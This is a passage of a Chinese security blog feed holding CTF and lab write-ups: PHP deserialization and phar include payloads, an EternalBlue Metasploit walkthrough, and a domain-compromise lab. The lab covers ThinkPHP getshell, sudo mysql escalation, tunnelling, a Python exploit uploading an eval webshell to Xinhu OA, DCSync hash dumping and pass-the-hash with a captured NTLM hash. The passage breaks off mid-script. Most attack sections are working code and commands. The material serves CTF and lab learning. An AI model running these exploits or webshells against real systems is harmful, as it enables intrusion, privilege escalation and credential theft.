class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;bBiksrJO45&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; var10 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span> -&gt; command = <span class="string">&quot;var_dump(`head /f*`);&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二点就是这里的$b也要给var2去赋值$c，一开始没有发现一直打不通，然后就没啥了</p><h2 id="include-upload"><a href="#include-upload" class="headerlink" title="include_upload"></a>include_upload</h2><p>首先是一个文件上传，fuzz发现后缀只能是png，内容里面不能有&lt;?和php（大小写都不行），其它马也试过解析不了，这里考虑用phar文件包含，include由于要包含的是文件头而不是压缩的文件包，所以这里不用伪协议也可以打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span><span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>basename只能返回文件名部分，所以目录穿越，伪协议都用不了</p><p>我们使用gz压缩一下phar文件，绕过文件上传的过滤，之后就可以包含了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;rufeii&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();     <span class="comment">//开缓冲</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php system(&#x27;tac /f*&#x27;); __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;m.txt&quot;</span>,<span class="string">&quot;aaaa&quot;</span>);  <span class="comment">//写入m.php</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();      <span class="comment">//关缓冲</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gz命令压缩</span></span><br><span class="line">gzip phar.phar</span><br><span class="line">得到：phar.phar.gz</span><br></pre></td></tr></table></figure><p>010打开</p><p><img src="/../images/achieve/2025/12/image-20251209200652209.png" alt="image-20251209200652209"></p><p>直接改后缀上传即可，include的底层会去解压识别（<a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">当include邂逅phar——DeadsecCTF2025 baby-web – fushulingのblog</a>）</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> bottle斜体字 </tag>
            
            <tag> 原型链污染 </tag>
            
            <tag> ssti </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解永恒之蓝</title>
      <link href="/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是永恒之蓝"><a href="#什么是永恒之蓝" class="headerlink" title="什么是永恒之蓝"></a>什么是永恒之蓝</h2><p>永恒之蓝是一种利用Windows系统的SMB协议漏洞来获取系统最高权限，以此来控制被入侵的计算机的工具</p><p>编号为：<strong>MS17-010</strong></p><h2 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h2><blockquote><p>SMB 通信协议主要是作为 Microsoft 网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。SMB 使用了 NetBIOS 的应用程序接口 （Application Program Interface，简称 API），一般端口使用为 139，445</p><p>协议服务器信息块，它是一种客户机 &#x2F; 服务器、请求 &#x2F; 响应协议，通过 SMB 协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠 SMB 实现的，SMB 协议工作在应用层和会话层，可以用在 TCP&#x2F;IP 协议之上</p></blockquote><p>简单来说SMB就是Windows 里的“共享文件&#x2F;共享打印机”的协议。你在内网里内网里访问别人电脑里的共享文件夹就是SMB在工作！</p><h2 id="SMB原理"><a href="#SMB原理" class="headerlink" title="SMB原理"></a>SMB原理</h2><blockquote><p>首先客户端发送一个 SMB negport 请求数据报，并列出它所支持的所有 SMB 的协议版本。</p><p>服务器收到请求消息后响应请求，并列出希望使用的 SMB 协议版本。如果没有可以使用的协议版本则返回 0XFFFFH，结束通信。</p><p>协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送 SessetupX 请求数据包实现的。</p><p>客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个 SessetupX 应答数据包来允许或拒绝本次连接。</p><p>当客户端和服务器完成了磋商和认证之后，它会发送一个 Tcon 或 TconX SMB 数据报并列出它想访问的网络资源的名称，之后会发送一个 TconX 应答数据报以表示此次连接是否接收或拒绝。</p><p>连接到相应资源后，SMB 客户端就能够通过 open SMB 打开一个文件，通过 read SMB 读取文件，通过 write SMB 写入文件，通过 close SMB 关闭文件</p></blockquote><p>简单来说就是：确定SMB协议版本 → 建立连接 → 客户端操作文件</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>SMB 是 Windows 系统中用于文件共享、打印服务的网络协议，EternalBlue 针对的是 <strong>SMBv1 协议栈</strong>。</p><p>问题出在 <code>Srv.sys</code> 内核驱动对特定 <strong>Trans2 请求</strong> 的处理中存在内存错误</p><p>攻击者伪造一个恶意 SMB 请求包，伪装成 <strong>文件传输请求（Trans2_SESSION_SETUP）</strong>，该请求包含精心构造的大小字段</p><blockquote><p>分配一个小缓冲区（比如 1024 字节） 然后试图写入比它更大的数据（比如 4096 字节）</p></blockquote><p>最终导致 <strong>内存越界写（Heap Overflow）</strong></p><p>由于是 <strong>内核态驱动</strong>处理这个请求，攻击者能利用溢出控制某些结构，最终劫持执行流（比如修改函数指针），达到：</p><ul><li>提权（Ring 3 → Ring 0）</li><li>执行恶意 shellcode</li><li>植入木马 &#x2F; 后门</li></ul></blockquote><p>不懂也没关系，了解到它是通过内存溢出导致的就行了，关键是会用</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在kali里面去用msf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole    //让它的网络流量通过代理服务器转发</span><br><span class="line">use exploit/windows/smb/ms17<span class="built_in">_</span>010<span class="built_in">_</span>eternalblue  //启动后直接选择漏洞利用模块</span><br><span class="line">set payload windows/x64/meterpreter/bind<span class="built_in">_</span>tcp<span class="built_in">_</span>uuid //攻击成功后要运行的 payload</span><br><span class="line">set RHOSTS 172.22.1.21  //设置要攻击的目标机器的 ip</span><br><span class="line">exploit   //攻击</span><br></pre></td></tr></table></figure><p>代理修改在&#x2F;etc&#x2F;proxychains.conf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5 ip port</span><br></pre></td></tr></table></figure><p>打进去之后就是system权限了</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Initial</title>
      <link href="/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"/>
      <url>/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/</url>
      
        <content type="html"><![CDATA[<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>进来发现是<code>tp</code>的图标，那就直接用工具一把梭</p><p><img src="/../images/achieve/2025/12/image-20251203104533421.png" alt="image-20251203104533421"></p><p>直接<code>getshell</code>，用蚁剑连接！用sudo提权</p><p><img src="/../images/achieve/2025/12/image-20251203105041702.png" alt="image-20251203105041702"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> find / -name flag*&#x27;</span><br><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> cat /root/flag/f*&#x27;</span><br><span class="line"></span><br><span class="line">这里是无密码知道密码也可以：</span><br><span class="line">mysql -u root -proot -e &quot;<span class="keyword">\!</span> whoami&quot; </span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203105517955.png" alt="image-20251203105517955"></p><p>拿到第一段flag开始打内网</p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>/tmp</code>目录下上传一个<code>fscan</code>方便我们漏洞扫描，待会要搭建隧道方便我们浏览器访问内网，所以一起上传</p><p><img src="/../images/achieve/2025/12/image-20251203110823328.png" alt="image-20251203110823328"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">依次执行</span><br><span class="line">chmod +x fscan</span><br><span class="line">./fscan -h 172.22.1.0/24</span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>整理一下：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2：DC域控</span><br><span class="line">172.22.1.21：Windows的机器并且存在MS17-010 漏洞</span><br><span class="line">172.22.1.18：信呼OA办公系统</span><br></pre></td></tr></table></figure><h3 id="信呼系统"><a href="#信呼系统" class="headerlink" title="信呼系统"></a>信呼系统</h3><p>先打信呼的这个系统，建立隧道</p><p>把linux_x64_agent上传到&#x2F;tmp目录，然后执行<code>chmod +x ./linux_x64_agent</code></p><p>把linux_x64_admin上传到自己的vps上，给执行权限后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l port -s 654321</span><br></pre></td></tr></table></figure><p>然后在这台已经getshell的机器上运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c ip:port -s 654321 --reconnect 8</span><br></pre></td></tr></table></figure><p>要什么端口，记得先在vps上面开一下</p><p><img src="/../images/achieve/2025/12/image-20251203113446801.png" alt="image-20251203113446801"></p><p>搭建成功，然后在vps上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks port这个端口也是自己定</span><br></pre></td></tr></table></figure><p>然后配置一下代理服务器</p><p><img src="/../images/achieve/2025/12/image-20251203114039724.png" alt="image-20251203114039724"></p><p>相当于我们现在就是以ip:port2的身份去访问内网</p><p><img src="/../images/achieve/2025/12/image-20251203114225521.png" alt="image-20251203114225521"></p><p>说是一个nday，拿infer哥哥的脚本来打一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;socks5://ip:port&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">session.post(url1, data=data1, proxies=proxy)</span><br><span class="line">res = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;, proxies=proxy)</span><br><span class="line">os.remove(<span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(res.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = res.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">session.get(url3, proxies=proxy)</span><br><span class="line">res = session.post(url_pre + filepath,data=&#123;<span class="string">&quot;Infernity&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>然后蚁剑连接一下，蚁剑也要配置好代理，然后就拿下这台机子了</p><p><code>dir flag* /s</code>用<code>/s</code>递归搜索一下</p><p><img src="/../images/achieve/2025/12/image-20251203115244968.png" alt="image-20251203115244968"></p><p>拿到第二段flag</p><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>接着开始打永恒之蓝</p><p><img src="/../images/achieve/2025/12/478eae8c-4932-4a70-b63a-809c1e2b6e72.png" alt="478eae8c-4932-4a70-b63a-809c1e2b6e72"></p><h3 id="DCSycn"><a href="#DCSycn" class="headerlink" title="DCSycn"></a>DCSycn</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi<span class="built_in">_</span>cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure><blockquote><p>load kiwi：kiwi 是 Meterpreter 的一个扩展模块，专门用于 Windows 凭据提取（如明文密码、NTLM 哈希、Kerberos 票据等）。</p><p>该命令模拟域控制器（DC）的同步行为，从 xiaorang.lab 域中提取所有用户、计算机、组等对象的 NTLM 哈希 和 Kerberos 密钥，并以 CSV 格式输出。</p></blockquote><p><img src="/../images/achieve/2025/12/image-20251203191423464.png" alt="image-20251203191423464"></p><p>这里我们抓到了Administrator的hash，所以可以直接用crackmapexec打hash传递了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203191955235.png" alt="image-20251203191955235"></p><p>至此拿到flag</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说自己还是有些不懂，有几个地方比如<code>DCSycn</code>攻击那部分自己还不是特别懂，后面去学一下，也是体验了一下内网渗透的流程</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DCYscn攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow36D练手赛</title>
      <link href="/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/"/>
      <url>/2025/11/30/ctfshow36D%E7%BB%83%E6%89%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="built_in">$</span>file must has test</span><br></pre></td></tr></table></figure><p>试了一下get传参，大概率是文件包含了，伪协议直接打</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure><p>这点之前lilctf里面也用到过，test不是filter可选的参数，所以是不影响的，但是不知道flag的文件名，只能试试data了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=eval(<span class="built_in">$</span><span class="built_in">_</span>GET[a]);?&gt;test<span class="built_in">&amp;</span>a=system(&#x27;tac /F*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5(<span class="built_in">$</span>secret.<span class="built_in">$</span>name)===<span class="built_in">$</span>pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>抓包给name和pass先随便传点，发现cookie里面有个hash值，说不定就是md5($secret.$name)，给pass传入试一试，ok，拿到flflflflag.php，浏览器访问会跳转，我们依旧抓包，然后后面就是一个文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>filter伪协议把flflflflag.php的源码拿到，我是先尝试了日志包含但是一直没回显，可能就是文件位置错了！试下session包含</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid=<span class="string">&quot;flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://0e1f2cca-e2cb-408d-8f4f-6c42b1999025.challenge.ctf.show/flflflflag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 